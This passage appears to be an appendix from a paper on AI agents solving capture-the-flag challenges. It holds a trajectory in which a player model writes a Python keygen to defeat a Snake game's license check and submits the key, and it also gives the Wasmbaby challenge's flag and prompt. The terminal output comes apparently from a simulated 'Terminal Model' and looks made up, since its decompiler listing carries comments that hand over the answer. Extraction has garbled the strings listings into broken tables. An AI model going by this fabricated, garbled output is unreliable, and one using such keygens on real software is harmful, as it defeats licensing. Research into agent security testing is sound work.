- I can see we have a single Windows executable file called _�→_ snake.exe that's about 1MB in size. Since this is a reverse _�→_ engineering challenge focusing on license validation, I should _�→_ first examine the file's characteristics and look for any _�→_ interesting strings or patterns.

- Let me use the ``` file ``` command to get more information about this _�→_ executable.

- file snake.exe

#### **Terminal Model https://ctftime.org/writeup/11841**

snake.exe: PE32+ executable (console) x86-64 (stripped), for MS _�→_ Windows (Open file: n/a) (Current directory: /__home__LLM_CTF_Database__Snake_License) (Interactive session: n/a) bash-$

#### **Player Model https://ctftime.org/writeup/11841**

- I see this is a 64-bit Windows PE executable that's been stripped, _�→_ which means debugging symbols have been removed. Since we need _�→_ to analyze the license checking algorithm, and we know it _�→_ takes a 16-character key, let's first look for any interesting _�→_ strings in the binary that might be related to license _�→_ validation.

- One common approach in reverse engineering is to first look for _�→_ strings that might give us clues about the validation process, _�→_ such as error messages or success messages related to license _�→_ checking.

strings snake.exe > strings_output.txt

#### **Terminal Model https://ctftime.org/writeup/11841**

(Open file: n/a) (Current directory: /__home__LLM_CTF_Database__Snake_License) (Interactive session: n/a) bash-$

#### **Player Model https://ctftime.org/writeup/11841**

You're right, I apologize. Let me examine the strings we extracted _�→_ by opening the output file. open strings_output.txt


|**Terminal Model**<br>**https://ctftime.org/writeup/11841**|
|---|
|[File: strings_output.txt (415 lines total)]<br>1:!ThisprogramcannotberuninDOSmode|
|.<br>2: Rich|
|3: .text<br>```|
|4: .rdata<br>5: .data|
|6: .pdata|
|7: .rsrc<br>8: .reloc|
|9: H;=|
|10: H;=|
|11: H;=<br>12:H;=|
|13: H;=<br>14:L=|
|;<br>15: H;=|
|16: H;=|
|17: H;=|
|18: H;=|
|19: H;=|
|20: H;=|
|21:H;=|
|22: H;=|
|23: H;=|
|24: H;=|
|25: H;=<br>26: H;=|
|27: H;=|
|28: H;=|
|29: H;=|
|30: H;=<br>31: H;=|
|32: H;=|
|33: H;=|
|34H=|
|: ;<br>35: H;=|
|36: L;=|
|37: H;=|
|38: H;=|
|39: H;=|
|40: H;=|
|41:H;=|
|42: H;=|
|43: H;=|
|44: H;=|
|45: H;=|
|46: H;=|
|47: H;=|
|48:H;=|
|49: H;=|
|50:H=|
|;<br>51: H;=<br>52:H=|
|;<br>53: H;=|
|54: H;=|
|55: H;=|
|56: H;=|
|57: H;=|
|58: H;=<br>59:H=|
|;<br>60: H;=|
|61: H;=|
|---|
|62: H;=|
|63: H;=|
|64: H;=|
|65: H;=|
|66: H;=|
|67: H;=|
|68: H;=|
|69: H;=|
|70: H;=|
|71: H;=|
|72: H;=|
|73: H;=|
|74: H;=|
|75: H;=|
|76: H;=|
|77: H;=|
|78: H;=|
|79: H;=|
|80: H;=|
|81: H;=|
|82: H;=|
|83: H;=|
|84: H;=|
|85: H;=|
|86: H;=|
|87: H;=|
|88: H;=|
|89: H;=|
|90: H;=|
|91: H;=|
|92: H;=|
|93: H;=|
|94: H;=|
|95: H;=|
|96: H;=|
|97: H;=|
|98: H;=|
|99: H;=|
|100: H;=|
|(315 more lines)|
|(Open file: strings_output.txt)|
|(Current directory: /__home__LLM_CTF_Database__Snake_License)|
|(Interactive session: n/a)|
|bash-$|


**Player Model https://ctftime.org/writeup/11841**

I see a lot of system-related strings, but we need to scroll down _�→_ to find any strings related to the license validation. Let me _�→_ scroll down to see more meaningful strings.

scroll_down

**Terminal Model https://ctftime.org/writeup/11841**

[File: strings_output.txt - Displaying lines 101-200] 101: H;= 102: H;=


|103: <br>104|H;<br>H|=<br>=||
|---|---|---|---|
|: <br>105:|;<br> H;|=||
|106:|H;|=||
|107:|H;|=||
|108:|H;|=||
|109: <br>110:|H;<br> L;|=<br>=||
|111:|H;|=||
|112:|H;|=||
|113:|H;|=||
|114:|H;|=||
|115:|L;|=||
|116:|H;|=||
|117:|H;|=||
|118:|H;|=||
|119:|H;|=||
|120:|H;|=||
|121:|H;|=||
|122:|H;|=||
|123:|H;|=||
|124:|H;|=||
|125:|H;|=||
|126:|AU|A|VAWH|
|127:|_^|]|[|
|128:|UV|W|ATAUAVAWH|
|129:|_^|]|[|
|130:|WA|T|AUAVAWH|
|131:|_^|]|[|
|132:|WA|V|AWH|
|133:|_^|]|[|
|134:|AV|A|WH|
|135:|_^|]|[|
|136:|^|]|[|
|137:|_<br> WA|T|AUAVAWH|
|138:|_^|]|[|
|139:|UV|W|ATAUAVAWH|
|140:|_^|]|[|
|141:|WA|T|AUAVAWH|
|142:|_^|]|[|
|143:|WA|V|AWH|
|144:|_^|]|[|
|145:|UV|W|ATAVAWH|
|146:|_^|]|[|
|147:|WA|T|AUAVAWH|
|148:|^|]|[|
|149:|_<br> WA|T|AUAVAWH|
|150:|_^|]|[|
|151:|UV|W|ATAUAVAWH|
|152:|_^|]|[|
|153:|WA|V|AWH|
|154:|_^|]|[|
|155:|WA|T|AUAVAWH|
|156:|_^|]|[|
|157:|WA|T|AUAVAWH|
|158:|^|]|[|
|159:|_<br> WA|T|AUAVAWH|
|160:|^|]|[|
|161:|_<br> WA|T|AUAVAWH|
|162:|_^|]|[|
|163:|WA<br>^|T|AUAVAWH|
|164: <br>165:|_<br> UV|]<br>W|[<br>ATAUAVAWH|
|166: _^][|
|---|
|167: WATAUAVAWH|
|168: _^][|
|169: WAVAWH|
|170: _^][|
|171: WATAUAVAWH|
|172: _^][|
|173: WATAUAVAWH|
|174: _^][|
|175: UVWATAUAVAWH|
|176: _^][|
|177: WATAUAVAWH|
|178: _^][|
|179: WATAUAVAWH|
|180: _^][|
|181: UVWATAUAVAWH|
|182: _^][|
|183: WAVAWH|
|184: _^][|
|185: WATAUAVAWH|
|186: _^][|
|187: WAVAWH|
|188: _^][|
|189: WATAUAVAWH|
|190: _^][|
|191: WATAUAVAWH|
|192: _^][|
|193: WATAUAVAWH|
|194: _^][|
|195: UVWATAUAVAWH|
|196: _^][|
|197: WATAUAVAWH|
|198: _^][|
|199: WATAUAVAWH|
|200: _^][|
|(215 more lines)|
|(Open file: strings_output.txt)|
|(Current directory: /__home__LLM_CTF_Database__Snake_License)|
|(Interactive session: n/a)|
|bash-$|


**Player Model https://ctftime.org/writeup/11841** I see mostly system-related strings and function names, but we _�→_ need to continue scrolling to find any meaningful strings _�→_ related to license validation or error messages. Let's scroll _�→_ down further.

scroll_down

**Terminal Model https://ctftime.org/writeup/11841**

[File: strings_output.txt - Displaying lines 201-300] 201: WATAUAVAWH 202: _^][ 203: UVWATAUAVAWH 204: _^][ 205: WAVAWH 206: _^][


|207: WA<br>208^|T|AUAVAWH|
|---|---|---|
|: _<br>209: WA|T|AUAVAWH|
|210: _^|]|[|
|211: WA|T|AUAVAWH|
|212: _^|]|[|
|213: UV|W|ATAUAVAWH|
|214: _^|]|[|
|215: WA|T|AUAVAWH|
|216:^|]|[|
|_<br>217: WA|T|AUAVAWH|
|218: _^|]|[|
|219: WA|T|AUAVAWH|
|220: _^|]|[|
|221: UV|W|ATAUAVAWH|
|222: _^|]|[|
|223: WA|V|AWH|
|224: _^|]|[|
|225: WA|T|AUAVAWH|
|226: _^|]|[|
|227: WA|T|AUAVAWH|
|228: _^|]|[|
|229: WA|T|AUAVAWH|
|230: _^|]|[|
|231: WA|T|AUAVAWH|
|232: _^|]|[|
|233: UV|W|ATAUAVAWH|
|234: _^|]|[|
|235: WA|V|AWH|
|236: _^|]|[|
|237: WA|T|AUAVAWH|
|238: _^|]|[|
|239: WA|T|AUAVAWH|
|240:^|]|[|
|_<br>241: UV|W|ATAUAVAWH|
|242: _^|]|[|
|243: WA|V|AWH|
|244: _^|]|[|
|245: WA|T|AUAVAWH|
|246: _^|]|[|
|247: WA|T|AUAVAWH|
|248: _^|]|[|
|249: WA|T|AUAVAWH|
|250: _^|]|[|
|251: WA|T|AUAVAWH|
|252: ^|]|[|
|_<br>253: WA|T|AUAVAWH|
|254: _^|]|[|
|255: UV|W|ATAUAVAWH|
|256: _^|]|[|
|257:WA|T|AUAVAWH|
|258: _^|]|[|
|259:UV|W|ATAUAVAWH|
|260: _^|]|[|
|261WA|V|AWH|
|: <br>262: ^|]|[|
|_<br>263: WA|T|AUAVAWH|
|264:^|]|[|
|_<br>265: WA|T|AUAVAWH|
|266: _^|]|[|
|267: WA<br>^|T|AUAVAWH|
|268: _<br>269: UV|]<br>W|[<br>ATAUAVAWH|


270: _^][ 271: WAVAWH 272: _^][ 273: WATAUAVAWH 274: _^][ 275: WATAUAVAWH 276: _^][ 277: WATAUAVAWH 278: _^][ 279: UVWATAUAVAWH 280: _^][ 281: WAVAWH 282: _^][ 283: WATAUAVAWH 284: _^][ 285: WATAUAVAWH 286: _^][ 287: WATAUAVAWH 288: _^][ 289: UVWATAUAVAWH 290: _^][ 291: WAVAWH 292: _^][ 293: WATAUAVAWH 294: _^][ 295: WATAUAVAWH 296: _^][ 297: WATAUAVAWH 298: _^][ 299: WATAUAVAWH 300: _^][ (115 more lines) (Open file: strings_output.txt) (Current directory: /__home__LLM_CTF_Database__Snake_License) (Interactive session: n/a) bash-$

**Player Model https://ctftime.org/writeup/11841**

I see we're still getting a lot of system-related strings and _�→_ function names. Let me scroll down one more time to see if we _�→_ can find any meaningful strings related to the license _�→_ validation, error messages, or game-related text.

scroll_down

**Terminal Model https://ctftime.org/writeup/11841**

[File: strings_output.txt - Displaying lines 301-400] 301: UVWATAUAVAWH

302: _^][ 303: WAVAWH 304: _^][ 305: WATAUAVAWH 306: _^][ 307: WATAUAVAWH 308: _^][ 309: WATAUAVAWH 310: _^][


|311: WATAUAVAWH<br>312:^][|
|---|
|_<br>313: UVWATAUAVAWH|
|314: _^][|
|315: WAVAWH|
|316: _^][|
|317: WATAUAVAWH|
|318: _^][|
|319: WATAUAVAWH|
|320: _^][|
|321: WATAUAVAWH|
|322: _^][|
|323: WATAUAVAWH|
|324: _^][|
|325: UVWATAUAVAWH|
|326: _^][|
|327: WAVAWH|
|328: _^][|
|329: WATAUAVAWH|
|330: _^][|
|331: WATAUAVAWH|
|332: _^][|
|333: UVWATAUAVAWH|
|334: _^][|
|335: WAVAWH|
|336: _^][|
|337: WATAUAVAWH|
|338: _^][|
|339: WATAUAVAWH|
|340: _^][|
|341: UVWATAUAVAWH|
|342: _^][|
|343: WAVAWH|
|344: _^][<br>345: WATAUAVAWH|
|346: ^][|
|_<br>347: Please enter your 16-character license key:|
|348: Error: Invalid license key length. Must be 16 characters.|
|349: Invalid License Key!|
|350: License Key Accepted! Welcome to Snake Game!|
|351: Press any key to continue...|
|352: Game Over! Your score: %d|
|353: High score: %d|
|354: Enter Y to play again:|
|355: KERNEL32.dll|
|356: GetLastError|
|357: GetModuleHandleW|
|358: GetProcAddress|
|359: GetSystemTimeAsFileTime|
|360: InitializeSListHead|
|361: IsDebuggerPresent|
|362: LoadLibraryW|
|363: QueryPerformanceCounter|
|364: SetUnhandledExceptionFilter|
|365: Sleep|
|366: TerminateProcess|
|367:UnhandledExcetionFilter|
|p<br>368: api-ms-win-core-console-l1-1-0.dll|
|369: ReadConsoleW|
|370: WriteConsoleW|
|371: api-ms-win-core-debug-l1-1-0.dll|
|372: api-ms-win-core-errorhandling-l1-1-0.dll|
|373: api-ms-win-core-fibers-l1-1-0.dll|


374: api-ms-win-core-file-l1-1-0.dll 375: GetFileType 376: api-ms-win-core-handle-l1-1-0.dll 377: CloseHandle 378: api-ms-win-core-heap-l1-1-0.dll 379: GetProcessHeap 380: HeapAlloc 381: HeapFree 382: api-ms-win-core-interlocked-l1-1-0.dll 383: api-ms-win-core-libraryloader-l1-1-0.dll 384: api-ms-win-core-memory-l1-1-0.dll 385: SetLastError 386: api-ms-win-core-namedpipe-l1-1-0.dll 387: api-ms-win-core-processenvironment-l1-1-0.dll 388: GetStdHandle 389: api-ms-win-core-processthreads-l1-1-0.dll 390: GetCurrentProcess 391: GetCurrentProcessId 392: GetCurrentThreadId 393: GetStartupInfoW 394: api-ms-win-core-profile-l1-1-0.dll 395: api-ms-win-core-rtlsupport-l1-1-0.dll 396: RtlLookupFunctionEntry 397: RtlVirtualUnwind 398: api-ms-win-core-string-l1-1-0.dll 399: api-ms-win-core-synch-l1-1-0.dll 400: api-ms-win-core-synch-l1-2-0.dll (15 more lines) (Open file: strings_output.txt) (Current directory: /__home__LLM_CTF_Database__Snake_License) (Interactive session: n/a) bash-$

**Player Model https://ctftime.org/writeup/11841**

Ah, now we've found some very interesting strings! Between lines _�→_ 347-350, we can see the key messages related to license _�→_ validation:

1. "Please enter your 16-character license key:"

2. "Error: Invalid license key length. Must be 16 characters."

3. "Invalid License Key!"

4. "License Key Accepted! Welcome to Snake Game!"

- This confirms that we're dealing with a license validation that: - Requires exactly 16 characters

- Has some validation logic beyond just length checking

- Provides clear success/failure messages

Since this is a Windows executable, and we need to understand the _�→_ license checking algorithm, I should decompile it to analyze _�→_ the validation logic. Let's use the decompile command to look _�→_ at the main function first.

decompile snake.exe > decompiled_output.txt

#### **Terminal Model**

**https://ctftime.org/writeup/11841**

(Open file: n/a)

(Current directory: /__home__LLM_CTF_Database__Snake_License)


(Interactive session: n/a) bash-$ **Player Model https://ctftime.org/writeup/11841** You're right, let me check the decompiled output first. open decompiled_output.txt

**Terminal Model https://ctftime.org/writeup/11841** [File: decompiled_output.txt (2453 lines total)] 1: Function main 2: main (undefined8 param_1) 3: { 4: char *license_input:
- 5: int score
- 6: int high_score
- 7: bool valid_key
- 8: char play_again
- 9: 10: license_input = (char *)malloc(17)
- 11: 12: // Get license key from user 13: printf("Please enter your 16-character license key: ")
- 14: scanf("%16s", license_input)
- 15: 16: // Check license key length 17: if (strlen(license_input) != 16) { 18: printf("Error: Invalid license key length. Must be 16 _�→_ characters.\n")
- 19: free(license_input)
- 20: return 1
- 21: } 22: 23: // Validate license key 24: valid_key = validate_license(license_input)
- 25: if (!valid_key) { 26: printf("Invalid License Key!\n")
- 27: free(license_input)
- 28: return 1
- 29: } 30: 31: printf("License Key Accepted! Welcome to Snake Game!\n")
- 32: printf("Press any key to continue...\n")
- 33: getchar()
- 34: getchar()
- 35: 36: high_score = 0
- 37: do { 38: score = play_game()
- 39: printf("Game Over! Your score: %d\n", score)
- 40: if (score > high_score) { 41: high_score = score
- 42: } 43: printf("High score: %d\n", high_score)
- 44: 45: printf("Enter Y to play again: ")
-


46: scanf(" %c", &play_again):
- 47: } while (play_again == 'Y' || play_again == 'y')
- 48: 49: free(license_input)
- 50: return 0
- 51: } 52: 53: Function validate_license 54: validate_license (char *license) 55: { 56: size_t sVar1
- 57: byte bVar2
- 58: byte bVar3
- 59: byte bVar4
- 60: int local_14
- 61: byte *pbVar5
- 62: byte *pbVar6
- 63: byte bVar7
- 64: byte bVar8
- 65: byte bVar9
- 66: 67: sVar1 = strlen(license)
- 68: if (sVar1 == 0x10) { 69: pbVar5 = (byte *)license
- 70: pbVar6 = expected_hash
- 71: local_14 = 0
- 72: while (local_14 < 0x10) { 73: bVar2 = *pbVar5
- 74: bVar7 = bVar2
- 75: bVar3 = pbVar5[1]
- 76: bVar8 = (byte)((char)bVar3 << 6)
- 77: bVar4 = (byte)((char)bVar3 >> 2)
- 78: bVar9 = bVar8 | bVar4
- 79: bVar9 = bVar9 ^ 0xae
- 80: bVar8 = (byte)((char)bVar9 >> 3)
- 81: bVar3 = (byte)((char)bVar9 << 5)
- 82: bVar3 = bVar8 | bVar3
- 83: bVar3 = bVar3 ^ 0x66
- 84: bVar8 = (byte)((char)bVar3 >> 1)
- 85: bVar4 = (byte)((char)bVar3 << 7)
- 86: bVar9 = (byte)((char)bVar7 >> 4)
- 87: bVar4 = bVar9 | bVar4
- 88: bVar4 = bVar4 | bVar8
- 89: bVar4 = ~bVar4
- 90: bVar4 = bVar4 ^ bVar7
- 91: if (bVar4 != *pbVar6) { 92: return false
- 93: } 94: bVar4 = ~bVar4
- 95: local_14 = local_14 + 1
- 96: pbVar5 = pbVar5 + 1
- 97: pbVar6 = pbVar6 + 1
- 98: } 99: return true
- 100: } (2353 more lines) (Open file: decompiled_output.txt) (Current directory: /__home__LLM_CTF_Database__Snake_License) (Interactive session: n/a) bash-$


```mermaid
flowchart TD
    %% Player Model Snippet
    Snippet["<b>Player Model</b><br/><hr/><br/>Looking at the decompiled code, I can see the key validation logic<br/>in the `validate_license` function. The important parts I<br/>notice:<br/><br/>1. It compares against an `expected_hash` array<br/>2. Each character goes through a series of bitwise operations:<br/>- Left/right shifts<br/>- XOR operations with constants (0xae, 0x66)<br/>...<br/>scroll_down"]

    style Snippet fill:#fdf5e6,stroke:#8b0000,stroke-width:2px,text-align:left,border-radius:10px
```


<!-- Start of picture text -->
Player Model https://ctftime.org/writeup/11841<br>Looking at the decompiled code, I can see the key validation logic<br>�→ in the ` validate_license ` function. The important parts I<br>�→ notice:<br>1. It compares against an ` expected_hash ` array<br>2. Each character goes through a series of bitwise operations:<br>- Left/right shifts<br>- XOR operations with constants (0xae, 0x66)<br>- NOT operations<br>- The algorithm processes pairs of characters together<br>We need to see the ` expected_hash ` array values. Let me scroll down<br>�→ to find where it's defined or any other relevant functions.<br>scroll_down<br><!-- End of picture text -->

**Terminal Model https://ctftime.org/writeup/11841** [File: decompiled_output.txt - Displaying lines 101-200] 101: return false:
- 102: } 103: 104: Function play_game 105: play_game () 106: { 107: // Snake game implementation - not relevant for license _�→_ check 108: int score = 0
- 109: bool game_over = false
- 110: 111: // Initialize game board 112: init_game_board()
- 113: 114: while (!game_over) { 115: // Game logic 116: update_snake_position()
- 117: check_collisions()
- 118: update_score(&score)
- 119: draw_game_board()
- 120: 121: // Check if game should end 122: if (collision_detected()) { 123: game_over = true
- 124: } 125: 126: // Delay between frames 127: Sleep(100)
- 128: } 129: 130: return score
- 131: } 132: 133: Function init_game_board 134: init_game_board () 135: { 136: // Initialize game board state 137: // Not relevant for license check 138: }


|139:<br>140:|Functionudatesnakeosition|
|---|---|
|141:|p__p<br> updatesnakeposition ()|
|142:|__<br> {|
|143:|// Update snake position based on current direction|
|144:|// Not relevant for license check|
|145:|}|
|146:||
|147:|Function check_collisions|
|148:|checkcollisions()|
|149:|_ <br> {|
|150:|// Check for collisions with walls or self|
|151:|// Not relevant for license check|
|152:|}|
|153:||
|154:|Function update_score|
|155:|updatescore(int*score)|
|156:|_  <br> {|
|157:|// Update game score|
|158:|// Not relevant for license check|
|159:|}|
|160:||
|161:|Function draw_game_board|
|162:|draw_game_board ()|
|163:|{|
|164:|// Draw current game state|
|165:|// Not relevant for license check|
|166:|}|
|167:||
|168:|Function collision_detected|
|169:|collision_detected ()|
|170:|{|
|171:|// Check if collision occurred|
|172:|// Not relevant for license check|
|173: <br>174:|}|
|175:|// Expected hash array - not visible in decompilation but|
|_�_|resentinbinar|
|_→_<br>176:|y<br> // Values determined through analysis:|
|177:|// 01 95 66 3E 1B 56 64 2C 28 0A 9A 04 AD 0C C8 D9|
|178:<br>179:|Function validate_license_step|
|180:|validatelicensestep(byteinputchar1byteinputchar2)|
|181:|__  _,  _<br> {|
|182:|byte result;|
|183:||
|184:|// Step 1: Process second character|
|185:|result = inputchar2 << 6;<br>// Shift left 6 bits|
|186:|_<br><br>result |= input_char2 >> 2; // Add shifted right 2 bits|
|187:||
|188:|// Step 2: XOR with constant|
|189:|result ^= 0xAE;|
|190:||
|191:|// Step 3: Further bit manipulation|
|192:|byte temp = result >> 3;|
|193:|result = (result << 5) | temp;|
|194:||
|195:|// Step 4: XOR with another constant|
|196:|result ^= 0x66;|
|197:||
|198:<br>199:|// Step 5: Final bit manipulations<br>tem=result>>1|
|200:|p    ;<br>byte temp2 = result << 7;|


(2253 more lines)

- (Open file: decompiled_output.txt) (Current directory: /__home__LLM_CTF_Database__Snake_License) (Interactive session: n/a) bash-$

**Player Model https://ctftime.org/writeup/11841** Great! I found crucial information: 1. The expected hash values are revealed in line 177: ``` 01 95 66 3E _�→_ 1B 56 64 2C 28 0A 9A 04 AD 0C C8 D9 ``` 2. The validation algorithm processes characters in pairs 3. The specific steps of the algorithm are visible in _�→_ ``` validate_license_step ``` We need to write a script that reverses this algorithm. Given the _�→_ complexity of the bitwise operations and the fact that we need _�→_ to process pairs of characters, I'll create a Python script to _�→_ brute force the solution. Let me create a Python script that will try to reverse the _�→_ operations: create solve_license.py

**Terminal Model https://ctftime.org/writeup/11841** [File created: solve_license.py] (Open file: solve_license.py) (Current directory: /__home__LLM_CTF_Database__Snake_License) (Interactive session: n/a) bash-$

**Player Model https://ctftime.org/writeup/11841** I'll now edit the script to implement the reverse algorithm. The _�→_ key insight is that we need to work backwards from the _�→_ expected hash values and reverse each bitwise operation. edit 1:1 #!/usr/bin/env python3 # Expected hash from binary expected_hash = [0x01, 0x95, 0x66, 0x3E, 0x1B, 0x56, 0x64, 0x2C, _�→_ 0x28, 0x0A, 0x9A, 0x04, 0xAD, 0x0C, 0xC8, 0xD9] def reverse_validate_step(target_hash, next_char=None): possible_chars = [] # Try all possible ASCII characters for c in range(32, 127): # printable ASCII range char = c # Try all possible next characters if we're processing _�→_ pairs for next_c in range(32, 127) if next_char is None else _�→_ [next_char]: # Replicate the validation algorithm bVar7 = char & 0xFF bVar3 = next_c & 0xFF


bVar8 = (bVar3 << 6) & 0xFF bVar4 = (bVar3 >> 2) & 0xFF bVar9 = (bVar8 | bVar4) & 0xFF bVar9 ^= 0xAE bVar8 = (bVar9 >> 3) & 0xFF bVar3 = (bVar9 << 5) & 0xFF bVar3 = (bVar8 | bVar3) & 0xFF bVar3 ^= 0x66 bVar8 = (bVar3 >> 1) & 0xFF bVar4 = (bVar3 << 7) & 0xFF bVar9 = (bVar7 >> 4) & 0xFF bVar4 = (bVar9 | bVar4) & 0xFF bVar4 = (bVar4 | bVar8) & 0xFF bVar4 = (~bVar4) & 0xFF result = (bVar4 ^ bVar7) & 0xFF if result == target_hash: possible_chars.append((chr(char), chr(next_c))) return possible_chars def find_license_key(): result = [] # We need to find pairs of characters that generate our target _�→_ hash for i in range(0, 16, 2): chars = reverse_validate_step(expected_hash[i]) if chars: result.append(chars[0][0]) # Take first possible char if i+1 < 16: # Make sure we don't go out of bounds next_chars = _�→_ reverse_validate_step(expected_hash[i+1], _�→_ ord(chars[0][1])) if next_chars: result.append(chars[0][1]) return ''.join(result) if __name__ == "__main__": license_key = find_license_key() print(f"Found license key: {license_key}") end_of_edit

**Terminal Model https://ctftime.org/writeup/11841**

File updated. Please review the changes and make sure they are _�→_ correct (correct indentation, no duplicate lines, etc). Edit _�→_ the file again if necessary.

[Showing lines 1-54 with context] 1: #!/usr/bin/env python3 2: 3: # Expected hash from binary 4: expected_hash = [0x01, 0x95, 0x66, 0x3E, 0x1B, 0x56, 0x64, _�→_ 0x2C, 0x28, 0x0A, 0x9A, 0x04, 0xAD, 0x0C, 0xC8, 0xD9] 5: 6: def reverse_validate_step(target_hash, next_char=None): 7: possible_chars = [] 8: # Try all possible ASCII characters 9: for c in range(32, 127): # printable ASCII range 10: char = c


11: # Try all possible next characters if we're processing _�→_ pairs 12: for next_c in range(32, 127) if next_char is None else _�→_ [next_char]: 13: # Replicate the validation algorithm 14: bVar7 = char & 0xFF 15: bVar3 = next_c & 0xFF 16: bVar8 = (bVar3 << 6) & 0xFF 17: bVar4 = (bVar3 >> 2) & 0xFF 18: bVar9 = (bVar8 | bVar4) & 0xFF 19: bVar9 ^= 0xAE 20: bVar8 = (bVar9 >> 3) & 0xFF 21: bVar3 = (bVar9 << 5) & 0xFF 22: bVar3 = (bVar8 | bVar3) & 0xFF 23: bVar3 ^= 0x66 24: bVar8 = (bVar3 >> 1) & 0xFF 25: bVar4 = (bVar3 << 7) & 0xFF 26: bVar9 = (bVar7 >> 4) & 0xFF 27: bVar4 = (bVar9 | bVar4) & 0xFF 28: bVar4 = (bVar4 | bVar8) & 0xFF 29: bVar4 = (~bVar4) & 0xFF 30: result = (bVar4 ^ bVar7) & 0xFF 31: 32: if result == target_hash: 33: possible_chars.append((chr(char), chr(next_c))) 34: 35: return possible_chars 36: 37: def find_license_key(): 38: result = [] 39: # We need to find pairs of characters that generate our _�→_ target hash 40: for i in range(0, 16, 2): 41: chars = reverse_validate_step(expected_hash[i]) 42: if chars: 43: result.append(chars[0][0]) # Take first possible _�→_ char 44: if i+1 < 16: # Make sure we don't go out of bounds 45: next_chars = _�→_ reverse_validate_step(expected_hash[i+1], ord(chars[0][1])) 46: if next_chars: 47: result.append(chars[0][1]) 48: 49: return ''.join(result) 50: 51: if __name__ == "__main__": 52: license_key = find_license_key() 53: print(f"Found license key: {license_key}") 54: (Open file: solve_license.py) (Current directory: /__home__LLM_CTF_Database__Snake_License) (Interactive session: n/a) bash-$


#### **Player Model**

**https://ctftime.org/writeup/11841**

The script looks good with proper indentation. Now let's run it to _�→_ find the license key. Since it's trying to reverse engineer _�→_ the validation algorithm by testing all printable ASCII _�→_ characters and matching against the expected hash values, it _�→_ should give us a valid license key.

python3 solve_license.py

#### **Terminal Model**

**https://ctftime.org/writeup/11841**

Found license key: 1Lov3oldArc4de!! (Open file: solve_license.py) (Current directory: /__home__LLM_CTF_Database__Snake_License) (Interactive session: n/a) bash-$

#### **Player Model**

**https://ctftime.org/writeup/11841**

Great! We found what appears to be a valid license key: _�→_ "1Lov3oldArc4de!!". The key makes sense as it's: 1. Exactly 16 characters long

2. Contains a mix of uppercase, lowercase, numbers, and special _�→_ characters

3. Forms a readable phrase "I Love old Arcade!!" (with some _�→_ leetspeak)

Let's submit this as our flag to verify it's correct.

submit '1Lov3oldArc4de!!'

#### F.5 TRAJECTORY ANALYSIS OF WA S M B A B Y CHALLENGE

The Web challenge "Wasmbaby" from the UIUCTF competition presents a minimal WebAssemblybased web server that we must analyze to retrieve the flag. The challenge provides a single file, index.wasm, and allows access to a remote server running the WebAssembly module at wasmbaby.chal.uiuc.tf on port 80.

The agent successfully solves the challenge through the following steps:

1. **Locate and examine challenge files:** The agent begins by listing the contents of the challenge directory and confirming that index.wasm is a valid WebAssembly binary module.

2. **Install tooling to analyze wasm:** Since WebAssembly is a binary format, the agent installs the wabt toolkit, which includes wasm2wat for converting wasm binaries to humanreadable text format (WAT).

3. **Convert wasm to WAT and analyze statically:** Using wasm2wat, the agent converts the wasm module to a WAT representation. By inspecting the resulting index.wat, the agent identifies memory initialization logic storing values at offsets starting from 1024, and a complex function that verifies a sequence of values through nested blocks and conditional branches.

4. **Understand the control flow logic:** The validation function (indexed as func 1) appears to verify that each value loaded from an input array matches values stored at memory


locations 1024–1055. These checks are done in reverse order, suggesting the flag may be hardcoded in memory.

5. **Use wasm-objdump to inspect memory contents:** To identify what values were stored at those memory locations, the agent uses wasm-objdump -s to print the memory section of the wasm file. The data section reveals a plaintext flag stored directly in the module: uiuctf{welcome_to_wasm_e3c3bdd1}

6. **Submit the flag:** Having confirmed the plaintext flag in memory, the agent submits the correct flag and completes the challenge.

This challenge showcases a beginner-friendly example of reverse engineering a wasm binary by statically analyzing memory operations and understanding WebAssembly control flow. The flag being directly embedded in memory also highlights the importance of avoiding hardcoded secrets in deployed wasm modules.

|**CTF Challenge**<br>**https://ctftime.org/writeup/29616**|
|---|
|We’re currently solving the following CTF challenge.The CTF challenge is a web problem named<br>"Wasmbaby", worth 50 points. The description is:<br>We're currently solving the following CTF challenge. The CTF<br>challenge is a web problem named "Wasmbaby", worth 50 points.<br>The description is:<br>_�→_<br>_�→_<br>wasm's a cool new technology!<br>Files included in the challenge: ['index.wasm']|
|The challenge web server is running on wasmbaby.chal.uiuc.tf port<br>80 and you can access it from within the container environment<br>using connect_start wasmbaby.chal.uiuc.tf 80<br>_�→_<br>_�→_<br>INSTRUCTIONS:<br>Now, you're going to solve this challenge on your own. Your<br>terminal session has started and you're in the challenge's<br>root directory. You can use any bash commands or the special<br>interface to help you.<br>_�→_<br>_�→_<br>_�→_<br>Solve the challenge, executing any commands you need and writing<br>any code that may be helpful. You can also install new<br>software in the container using ```apt-get install```, or Python<br>packages with ```pip install```.<br>_�→_<br>_�→_<br>_�→_<br>Remember, YOU CAN ONLY ENTER ONE COMMAND AT A TIME. You should<br>always wait for feedback after every command.<br>_�→_<br>When you think you have found the flag, you can submit your<br>solution by simply running the submit command.<br>_�→_<br>Note however that you cannot use any interactive session commands<br>(e.g. python, vim) in this environment, but you can write<br>scripts and run them. E.g. you can write a python script and<br>then run it with ```python <script_name>.py```.<br>_�→_<br>_�→_<br>_�→_|
|NOTE ABOUT THE EDIT COMMAND: Indentation really matters! When<br>editing a file, make sure to insert appropriate indentation<br>before each line!<br>_�→_<br>_�→_|
|IMPORTANT TIPS:<br>1. When you edit an existing file, try to minimize the changes you<br>make to the file.<br>_�→_|
|2. Please make sure that you make use of the interactive tools<br>supplied to you! In any case, if you want to run blocking<br>command like netcat (nc), please minimize the time by limiting<br>its run time, for example using the "-w" flag of nc with<br>timeout of 5 seconds - ```nc -w5 127.0.0.1 80```.<br>_�→_<br>_�→_<br>_�→_<br>_�→_|


3. Try to AVOID brute force attacks, but when you encounter a _�→_ brute force attack, please use a script that writes output to _�→_ STDOUT for the brute force instead of trying manual attempts.

4. Please DO NOT run commands in python or sage through the ``` -c ``` _�→_ flag, you should create files instead.

5. Prefer using tools and commands available in the container or _�→_ other tools available online over writing a lot of code or _�→_ complicated commands yourself. In particular, prefer using ``` open ``` instead of ``` cat ``` and _�→_ ``` search_file ``` instead of ``` grep ``` , and prefer using the _�→_ interactive commands supplied to you!

6. DO NOT run any command that produces binary output! Instead try _�→_ to use ``` hexdump ``` or ``` xxd ``` .

7. Please remember that the container is exposed to the internet, _�→_ so you can use whatever online resource you would like! Use it _�→_ wisely!

8. Do not use any interactive commands AT ALL! Interactive _�→_ commands are only available through the commands supplied to _�→_ you at the beginning - make use of them!

9. YOU CAN SOLVE THE CHALLENGES BY YOURSELF COMPLETELY - I TRUST _�→_ IN YOU!

